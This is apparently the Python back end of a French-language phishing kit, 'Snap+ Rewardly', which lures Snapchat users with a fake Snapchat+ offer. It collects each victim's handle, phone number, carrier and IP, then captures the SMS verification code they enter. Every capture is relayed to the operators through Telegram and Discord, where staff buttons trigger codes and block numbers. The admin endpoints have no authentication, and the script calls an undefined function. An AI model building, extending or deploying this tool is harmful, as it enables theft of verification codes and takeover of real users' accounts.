import json, os, time, asyncio, threading, urllib.request
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse
from datetime import datetime, timezone
import discord
from discord.ext import tasks

PORT = int(os.environ.get("PORT", 3000))
SITE_DIR = os.path.dirname(os.path.abspath(__file__))
SITE_URL = os.environ.get("SITE_URL", f"http://localhost:{PORT}")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "1529646415129612393"))
PING_ROLE_ID = int(os.environ.get("PING_ROLE_ID", "0"))
MOD_GUILD_ID = int(os.environ.get("MOD_GUILD_ID", "1547685592320704552"))
TICKET_CATEGORY_ID = int(os.environ.get("TICKET_CATEGORY_ID", "1547685592928751626"))
STAFF_ROLE_ID = int(os.environ.get("STAFF_ROLE_ID", "1568774298926059592"))
LOG_CHANNEL_ID = int(os.environ.get("LOG_CHANNEL_ID", "0"))
ADMIN_PASS = "admin123"
DISCORD_ENABLED = os.environ.get("DISCORD_ENABLED", "") == "1"
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

SERVICES = {
    "snap": "Snapchat+",
}

requests_db = {}
history_log = []
notification_queue = []
queue_lock = threading.Lock()
blocked_phones = set()
blocked_users = set()
DATA_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data.json")


def norm_phone(p):
    return "".join(ch for ch in str(p or "") if ch.isdigit())


def load_data():
    global requests_db, history_log, blocked_phones, blocked_users
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            d = json.load(f)
        requests_db = {k: v for k, v in d.get("requests", {}).items()}
        history_log = list(d.get("history", []))
        blocked_phones = set(d.get("blocked_phones", []))
        blocked_users = set(d.get("blocked_users", []))
        print("  [server] donnees chargees depuis data.json (%d demandes, %d bloques)" % (len(requests_db), len(blocked_phones)))
    except Exception:
        pass


def persist():
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump({
                "requests": requests_db,
                "history": history_log[-200:],
                "blocked_phones": sorted(blocked_phones),
                "blocked_users": sorted(blocked_users),
            }, f, ensure_ascii=False)
    except Exception as e:
        print("  [server] echec sauvegarde data.json: %s" % e)


intents = discord.Intents.all()
bot = discord.Client(intents=intents)


def tg_esc(s):
    return str(s or "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def format_phone(n):
    s = str(n or "").strip()
    if not s:
        return ""
    out = ""
    count = 0
    for ch in s:
        if ch.isdigit():
            if count and count % 2 == 0:
                out += " "
            count += 1
        out += ch
    return out


def tg_api(method, data, timeout=12):
    if not TELEGRAM_TOKEN:
        return None
    try:
        req = urllib.request.Request(
            "https://api.telegram.org/bot%s/%s" % (TELEGRAM_TOKEN, method),
            data=json.dumps(data).encode(),
            headers={"Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        print("  [telegram] erreur %s: %s" % (method, e))
        return None


def tg_autodetect_chat():
    res = tg_api("getUpdates", {"limit": 20})
    if not res or not res.get("ok"):
        return None
    for u in res.get("result", []):
        m = u.get("message") or u.get("channel_post")
        if m and m.get("chat"):
            return m["chat"]["id"]
    return None


_detected_chat = None
_tg_offset = None


def tg_send(text, keyboard=None):
    global _detected_chat
    if not TELEGRAM_TOKEN:
        return False
    chat = TELEGRAM_CHAT_ID or _detected_chat or tg_autodetect_chat()
    if not chat:
        return False
    if not _detected_chat:
        _detected_chat = chat
    payload = {"chat_id": chat, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
    if keyboard:
        payload["reply_markup"] = {"inline_keyboard": keyboard}
    res = tg_api("sendMessage", payload)
    if not res or not res.get("ok"):
        print("  [telegram] echec envoi: %s" % (res or {}).get("description"))
        return False
    return True


def tg_notify_request(data, rid):
    svc = data.get("service", "")
    text = (
        "📲 <b>Nouvelle demande Snap+</b>\n"
        "─────────────\n"
        "Service : <b>%s</b>\n"
        "Pseudo : %s\n"
        "Compte : %s\n"
        "Numero : <code>%s</code>\n"
        "Operateur : %s\n"
        "IP : %s\n"
        "ID : <code>%s</code>"
    ) % (
        SERVICES.get(svc, svc),
        tg_esc(data.get("pseudo") or "-"),
        tg_esc(data.get("handle") or "-"),
        tg_esc(format_phone(data.get("phone")) or "-"),
        tg_esc(data.get("operator") or "-"),
        tg_esc(data.get("ip") or "-"),
        rid[:8].upper(),
    )
    keyboard = [
        [{"text": "📤 Envoyer le code", "callback_data": "code:" + rid}],
        [{"text": "❌ Refuser", "callback_data": "deny:" + rid}],
        [{"text": "🚫 Bloquer ce numero", "callback_data": "block:" + rid}],
    ]
    tg_send(text, keyboard)


def tg_notify_code(rid, code, data):
    text = (
        "🔑 <b>Code SMS recu</b>\n"
        "─────────────\n"
        "Pseudo : %s\n"
        "Numero : <code>%s</code>\n"
        "Code : <b>%s</b>\n"
        "Service : %s\n"
        "ID : <code>%s</code>"
    ) % (
        tg_esc(data.get("pseudo") or "-"),
        tg_esc(format_phone(data.get("phone")) or "-"),
        tg_esc(code),
        SERVICES.get(data.get("service", ""), data.get("service", "-")),
        rid[:8].upper(),
    )
    tg_send(text)


# ==================== TICKET VIEW (nouveau panel Discord) ====================

class TicketView(discord.ui.View):
    def __init__(self, rid):
        super().__init__(timeout=None)
        self.rid = rid

    async def _req(self):
        return requests_db.get(self.rid)

    async def _update_embed(self, interaction, title, description, color):
        r = await self._req()
        if not r:
            return
        embed = discord.Embed(title=title, description=description, color=color)
        embed.add_field(name="Pseudo", value=r["data"].get("pseudo") or "-", inline=True)
        embed.add_field(name="Compte", value=("@" + r["data"].get("handle")) if r["data"].get("handle") else "-", inline=True)
        embed.add_field(name="Telephone", value=format_phone(r["data"].get("phone")) or "-", inline=True)
        embed.add_field(name="Operateur", value=r["data"].get("operator") or "-", inline=True)
        embed.set_footer(text="ID: %s" % self.rid[:8].upper())
        try:
            await interaction.message.edit(embed=embed, view=self)
        except Exception:
            pass

    @discord.ui.button(label="Valider l'acces", style=discord.ButtonStyle.green, emoji="✅", custom_id="btn_validate")
    async def btn_validate(self, interaction: discord.Interaction, button: discord.ui.Button):
        r = requests_db.get(self.rid)
        if not r:
            return await interaction.response.send_message("Demande introuvable.", ephemeral=True)
        r["state"] = "done"
        r["by"] = "accept"
        history_log.append({"action": "accept", "data": r["data"], "ts": int(time.time() * 1000)})
        persist()
        await interaction.response.send_message("✅ Demande %s validee." % self.rid[:8], ephemeral=True)
        await self._update_embed(interaction, "✅ Demande validee", "Traite par %s" % interaction.user.mention, 0x22C55E)

    @discord.ui.button(label="Renvoyer", style=discord.ButtonStyle.secondary, emoji="🔄", custom_id="btn_resend")
    async def btn_resend(self, interaction: discord.Interaction, button: discord.ui.Button):
        r = requests_db.get(self.rid)
        if not r:
            return await interaction.response.send_message("Demande introuvable.", ephemeral=True)
        r["code_sent"] = False
        persist()
        await interaction.response.send_message("🔄 Code a renvoyer pour %s." % self.rid[:8], ephemeral=True)

    @discord.ui.button(label="Message", style=discord.ButtonStyle.secondary, emoji="💬", custom_id="btn_msg")
    async def btn_msg(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message("💬 Envoie un message prive a l'utilisateur.", ephemeral=True)

    @discord.ui.button(label="Rejeter", style=discord.ButtonStyle.danger, emoji="❌", custom_id="btn_reject")
    async def btn_reject(self, interaction: discord.Interaction, button: discord.ui.Button):
        r = requests_db.get(self.rid)
        if not r:
            return await interaction.response.send_message("Demande introuvable.", ephemeral=True)
        r["state"] = "done"
        r["by"] = "refuse"
        history_log.append({"action": "refuse", "data": r["data"], "ts": int(time.time() * 1000)})
        persist()
        await interaction.response.send_message("❌ Demande %s refusee." % self.rid[:8], ephemeral=True)
        await self._update_embed(interaction, "❌ Demande refusee", "Traite par %s" % interaction.user.mention, 0xF87171)

    @discord.ui.button(label="Supprimer le salon", style=discord.ButtonStyle.danger, emoji="🗑️", custom_id="btn_close")
    async def btn_close(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(
            "Est-ce que le numero a marche ?",
            components=[
                discord.ui.Button(label="Oui", style=discord.ButtonStyle.green, custom_id="close_yes"),
                discord.ui.Button(label="Non", style=discord.ButtonStyle.red, custom_id="close_no"),
                discord.ui.Button(label="Annuler", style=discord.ButtonStyle.secondary, custom_id="close_cancel"),
            ],
            ephemeral=True
        )

    @discord.ui.select(placeholder="⚙️ Actions staff...", custom_id="sel_staff", options=[
        discord.SelectOption(label="Réinitialiser", value="reset", emoji="🔄"),
        discord.SelectOption(label="Blacklister le numéro", value="blacklist_num", emoji="🔴"),
        discord.SelectOption(label="Blacklister l'utilisateur", value="blacklist_user", emoji="⛔"),
        discord.SelectOption(label="Expulser", value="kick", emoji="👢"),
        discord.SelectOption(label="Bannir", value="ban", emoji="🔨"),
    ])
    async def staff_select(self, interaction: discord.Interaction, select: discord.ui.Select):
        r = requests_db.get(self.rid)
        val = select.values[0]
        if val == "reset":
            if r:
                r["state"] = "pending"
                r["code_sent"] = False
                persist()
            await interaction.response.send_message("🔄 Tentative reinitialisee.", ephemeral=True)
        elif val == "blacklist_num":
            if r:
                phone = norm_phone(r["data"].get("phone"))
                if phone:
                    blocked_phones.add(phone)
                r["state"] = "done"
                r["by"] = "block"
                persist()
            await interaction.response.send_message("🔄 Numero blackliste.", ephemeral=True)
        elif val == "blacklist_user":
            blocked_users.add(interaction.user.id)
            await interaction.response.send_message("⛔ Utilisateur blackliste.", ephemeral=True)
        elif val == "kick":
            await interaction.response.send_message("👢 Expulsion (a configurer).", ephemeral=True)
        elif val == "ban":
            await interaction.response.send_message("🔨 Bannissement (a configurer).", ephemeral=True)


# ==================== BOT DISCORD ====================

async def send_request_notification(rid, data):
    guild = bot.get_guild(MOD_GUILD_ID)
    if not guild:
        print("  [discord] Serveur introuvable")
        return

    category = None
    try:
        category = await guild.fetch_channel(TICKET_CATEGORY_ID)
    except Exception:
        pass
    if not category or category.type != discord.ChannelType.category:
        print("  [discord] Categorie ticket introuvable")
        return

    svc = data.get("service", "")
    pseudo = data.get("pseudo", "Inconnu")
    phone = data.get("phone", "")
    handle = data.get("handle", "-")
    op = data.get("operator", "Inconnu")
    chan_name = "verif-%s-%s" % (pseudo[:15].lower().replace(" ", "-"), rid[:6])

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(view_channel=False),
        guild.get_role(STAFF_ROLE_ID): discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True),
        guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, read_message_history=True, manage_channels=True),
    }

    try:
        channel = await guild.create_text_channel(
            name=chan_name,
            category=category,
            overwrites=overwrites,
            reason="Ticket verification %s %s" % (pseudo, rid[:8])
        )
    except Exception as e:
        print("  [discord] erreur creation salon: %s" % e)
        return

    embed = discord.Embed(
        title="%s • %s" % (pseudo, rid[:8].upper()),
        description=(
            "%s\n\n"
            "Presence · %d membres\n\n"
            "**Soumis** · %s\n\n"
            "Claim par @_"
        ) % (guild.name, guild.member_count or 0, datetime.now().strftime("%d %B %Y à %H:%M")),
        color=0x2b2d31
    )
    embed.add_field(name="Pseudo", value=pseudo, inline=True)
    embed.add_field(name="Compte Snap", value="@%s" % handle if handle else "-", inline=True)
    embed.add_field(name="Numero", value="`%s` · %s" % (format_phone(phone), op), inline=False)

    content = "<@&%d> Nouvelle demande Snap+" % STAFF_ROLE_ID
    await channel.send(content=content, embed=embed, view=TicketView(rid))

    # Notification sur le salon principal (optionnel)
    main_ch = bot.get_channel(CHANNEL_ID)
    if main_ch:
        content2 = f"<@&{PING_ROLE_ID}>" if PING_ROLE_ID else None
        embed2 = discord.Embed(title="Nouvelle demande Snap+", color=0xFFFC00)
        embed2.add_field(name="Service", value=SERVICES.get(svc, svc), inline=True)
        embed2.add_field(name="Pseudo", value=data.get("pseudo") or "-", inline=True)
        embed2.add_field(name="Compte", value=("@" if svc == "snap" else "") + (data.get("handle") or "-"), inline=True)
        embed2.add_field(name="Numero", value=f"`{format_phone(data.get('phone'))}`", inline=True)
        embed2.add_field(name="Operateur", value=data.get("operator") or "-", inline=True)
        embed2.add_field(name="IP", value=data.get("ip") or "-", inline=True)
        embed2.set_footer(text="ID: %s" % rid[:8].upper())
        await main_ch.send(content=content2, embed=embed2)

    # Telegram
    tg_notify_request(data, rid)


async def send_code_received(rid, code, data):
    channel = bot.get_channel(CHANNEL_ID)
    if not channel:
        return
    embed = discord.Embed(title="Code SMS recu", color=0x22C55E)
    embed.add_field(name="Code", value=f"||{code}||", inline=True)
    embed.add_field(name="Pseudo", value=data.get("pseudo") or "-", inline=True)
    embed.add_field(name="Numero", value=f"`{format_phone(data.get('phone'))}`", inline=True)
    embed.add_field(name="Service", value=SERVICES.get(data.get("service"), "-"), inline=True)
    embed.set_footer(text=f"ID: {rid[:8].upper()}")
    await channel.send(content="@everyone", embed=embed)


@tasks.loop(seconds=2)
async def process_queue():
    items = []
    with queue_lock:
        items = notification_queue.copy()
        notification_queue.clear()
    for item in items:
        try:
            a = item["action"]
            if a == "new_request":
                await send_request_notification(item["rid"], item["data"])
            elif a == "code_received":
                await send_code_received(item["rid"], item["code"], item["data"])
            elif a == "action_done":
                ch = bot.get_channel(CHANNEL_ID)
                if ch:
                    await ch.send(embed=discord.Embed(title=item["title"], color=item["color"], description=item["desc"]))
        except Exception as e:
            print(f"  [discord] erreur: {e}")


@process_queue.before_loop
async def before_process_queue():
    await bot.wait_until_ready()


@bot.event
async def on_ready():
    print("  [discord] Bot connecte: %s" % bot.user)
    if not process_queue.is_running():
        process_queue.start()


def queue_notification(item):
    if not DISCORD_ENABLED:
        return
    with queue_lock:
        notification_queue.append(item)


def run_bot():
    try:
        bot.run(BOT_TOKEN)
    except Exception as e:
        print("  [discord] Erreur demarrage: %s" % e)


def reply(handler, data, code=200):
    body = json.dumps(data).encode()
    handler.send_response(code)
    handler.send_header("Content-Type", "application/json")
    handler.send_header("Access-Control-Allow-Origin", "*")
    handler.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
    handler.send_header("Access-Control-Allow-Headers", "Content-Type,X-Admin-Key")
    handler.end_headers()
    handler.wfile.write(body)


def body_read(handler):
    n = int(handler.headers.get("Content-Length", 0))
    return json.loads(handler.rfile.read(n)) if n else {}


class Server(SimpleHTTPRequestHandler):
    def __init__(self, *a, **kw):
        super().__init__(*a, directory=SITE_DIR, **kw)

    def log_message(self, fmt, *args):
        if "304" not in str(args):
            super().log_message(fmt, *args)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type,X-Admin-Key")
        self.end_headers()

    def do_GET(self):
        p = urlparse(self.path).path

        if p == "/":
            self.path = "/choose.html"
            return super().do_GET()

        if p.startswith("/api/status/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return reply(self, {"ok": False, "status": "expired"})
            if r["state"] == "done":
                return reply(self, {"ok": True, "status": "resolved"})
            if r.get("code_sent"):
                return reply(self, {"ok": True, "status": "code_sent", "at": r["code_sent_at"]})
            return reply(self, {"ok": True, "status": "pending"})

        if p == "/api/admin/stats":
            pend = sum(1 for r in requests_db.values() if r["state"] == "pending")
            acc = sum(1 for r in requests_db.values() if r["state"] == "done" and r.get("by") == "accept")
            ref = sum(1 for r in requests_db.values() if r["state"] == "done" and r.get("by") == "refuse")
            return reply(self, {"ok": True, "total": len(requests_db), "pending": pend, "accepted": acc, "refused": ref})

        if p == "/api/admin/list":
            items = [{"id": rid, "data": r["data"], "code_sent": r.get("code_sent", False), "code_sent_at": r.get("code_sent_at")} for rid, r in requests_db.items() if r["state"] == "pending"]
            return reply(self, {"ok": True, "items": items})

        if p == "/api/admin/history":
            return reply(self, {"ok": True, "items": history_log[-50:][::-1]})

        if p == "/api/admin/blocked":
            return reply(self, {"ok": True, "items": sorted(blocked_phones)})

        super().do_GET()

    def do_POST(self):
        p = urlparse(self.path).path
        d = body_read(self)

        if p == "/api/request":
            rid = d.get("rid", "")
            data = {k: d.get(k) for k in ["service", "pseudo", "handle", "phone", "operator", "opType", "ip", "device", "browser", "os"]}
            phone = norm_phone(data.get("phone"))
            if phone and phone in blocked_phones:
                requests_db[rid] = {
                    "data": data,
                    "state": "done",
                    "by": "block",
                    "code_sent": False,
                    "code_sent_at": None,
                    "ts": d.get("ts", int(time.time() * 1000)),
                }
                history_log.append({"action": "block", "data": data, "ts": int(time.time() * 1000)})
                print("  [server] Demande spam auto-bloquee: %s (%s)" % (phone, data.get("pseudo")))
                queue_notification({"action": "action_done", "title": "Spam bloque", "desc": f"Le numero **{format_phone(phone)}** (bloque) a tente une demande et a ete refuse automatiquement.", "color": 0xEF4444})
                tg_send("🚫 <b>Spam bloque</b>\nNumero : <code>%s</code>\nPseudo : %s\nUne demande d'un numero bloque a ete refusee automatiquement." % (tg_esc(format_phone(phone)), tg_esc(data.get("pseudo") or "-")))
                persist()
                return reply(self, {"ok": True})
            requests_db[rid] = {
                "data": data,
                "state": "pending",
                "code_sent": False,
                "code_sent_at": None,
                "ts": d.get("ts", int(time.time() * 1000)),
            }
            queue_notification({"action": "new_request", "rid": rid, "data": requests_db[rid]["data"]})
            print("  [server] Nouvelle demande recue: %s (%s)" % (requests_db[rid]["data"].get("phone"), requests_db[rid]["data"].get("pseudo")))
            tg_notify_request(requests_db[rid]["data"], rid)
            persist()
            return reply(self, {"ok": True})

        if p == "/api/code":
            rid = d.get("rid", "")
            code = d.get("code", "")
            r = requests_db.get(rid)
            if not r:
                return reply(self, {"ok": False}, 404)
            queue_notification({"action": "code_received", "rid": rid, "code": code, "data": r["data"]})
            tg_notify_code(rid, code, r["data"])
            persist()
            return reply(self, {"ok": True})

        if p.startswith("/api/admin/code/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return reply(self, {"ok": False, "error": "not_found"})
            r["code_sent"] = True
            r["code_sent_at"] = int(time.time() * 1000)
            history_log.append({"action": "send", "data": r["data"], "ts": int(time.time() * 1000)})
            queue_notification({"action": "action_done", "title": "Code SMS declenche", "desc": f"Code envoye a **{r['data'].get('pseudo', '-')}** ({format_phone(r['data'].get('phone')) or '-'})", "color": 0xFFFC00})
            persist()
            return reply(self, {"ok": True})

        if p.startswith("/api/admin/accept/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return reply(self, {"ok": False, "error": "not_found"})
            r["state"] = "done"
            r["by"] = "accept"
            history_log.append({"action": "accept", "data": r["data"], "ts": int(time.time() * 1000)})
            queue_notification({"action": "action_done", "title": "Demande acceptee", "desc": f"**{r['data'].get('pseudo', '-')}** acceptee.", "color": 0x22C55E})
            persist()
            return reply(self, {"ok": True})

        if p.startswith("/api/admin/refuse/"):
            rid = p.split("/")[-1]
            r = requests_db.get(rid)
            if not r:
                return reply(self, {"ok": False, "error": "not_found"})
            r["state"] = "done"
            r["by"] = "refuse"
            history_log.append({"action": "refuse", "data": r["data"], "ts": int(time.time() * 1000)})
            queue_notification({"action": "action_done", "title": "Demande refusee", "desc": f"**{r['data'].get('pseudo', '-')}** refusee.", "color": 0xF87171})
            persist()
            return reply(self, {"ok": True})

        if p == "/api/admin/block":
            phone = norm_phone(d.get("phone", ""))
            if not phone:
                return reply(self, {"ok": False, "error": "missing_phone"})
            blocked_phones.add(phone)
            history_log.append({"action": "block", "data": {"phone": phone}, "ts": int(time.time() * 1000)})
            tg_send("🚫 Numero <code>%s</code> ajoute a la liste noire." % tg_esc(format_phone(phone)))
            persist()
            return reply(self, {"ok": True, "blocked": sorted(blocked_phones)})

        if p == "/api/admin/unblock":
            phone = norm_phone(d.get("phone", ""))
            blocked_phones.discard(phone)
            tg_send("✅ Numero <code>%s</code> retire de la liste noire." % tg_esc(format_phone(phone)))
            persist()
            return reply(self, {"ok": True, "blocked": sorted(blocked_phones)})

        if p in ("/api/visit", "/api/log"):
            return reply(self, {"ok": True})

        self.send_error(404)


if __name__ == "__main__":
    print("\n  Snap+ Rewardly - http://localhost:%d\n" % PORT)
    load_data()
    if TELEGRAM_TOKEN:
        print("  [telegram] TELEGRAM_TOKEN configure...")
        tg_send("✅ Notifications Telegram activees pour Snap+ Rewardly")
        threading.Thread(target=lambda: __import__('threading').Thread(target=tg_poll, daemon=True).start(), daemon=True)
        print("  [telegram] polling des boutons demarre")
    else:
        print("  [telegram] Pas de TELEGRAM_TOKEN, notifications Telegram desactivees")
    if BOT_TOKEN and DISCORD_ENABLED:
        threading.Thread(target=run_bot, daemon=True).start()
        time.sleep(3)
    elif BOT_TOKEN:
        print("  [discord] Bot Discord desactive (mets DISCORD_ENABLED=1 pour l'activer)")
    else:
        print("  [discord] Pas de BOT_TOKEN, bot desactive")
    HTTPServer(("0.0.0.0", PORT), Server).serve_forever()
